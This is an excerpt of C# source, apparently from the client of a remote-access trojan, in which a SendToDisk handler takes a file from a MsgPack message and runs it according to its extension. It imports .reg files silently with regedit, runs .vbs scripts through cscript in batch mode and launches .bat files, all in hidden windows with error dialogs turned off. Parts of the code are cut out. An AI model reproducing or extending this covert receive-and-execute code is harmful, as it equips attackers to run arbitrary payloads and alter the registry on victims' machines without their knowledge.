    ...
    public class HandleSendTo
    {
        public void SendToDisk(MsgPack unpack_msgpack)
        {
            try
            {
                ...
                else if (unpack_msgpack.ForcePathObject("Extension").AsString.ToLower().EndsWith(".reg"))
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = "cmd",
                        Arguments = $"/c regedit /s {fullPath} & exit",
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        UseShellExecute = true,
                        ErrorDialog = false,
                ...
                else if (unpack_msgpack.ForcePathObject("Extension").AsString.ToLower().EndsWith(".bat"))
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = "cmd",
                ...
                else if (unpack_msgpack.ForcePathObject("Extension").AsString.ToLower().EndsWith(".vbs"))
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = "cmd",
                        Arguments = $"/c cscript.exe //Nologo //B {fullPath} & exit",
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        UseShellExecute = true,
                        ErrorDialog = false,
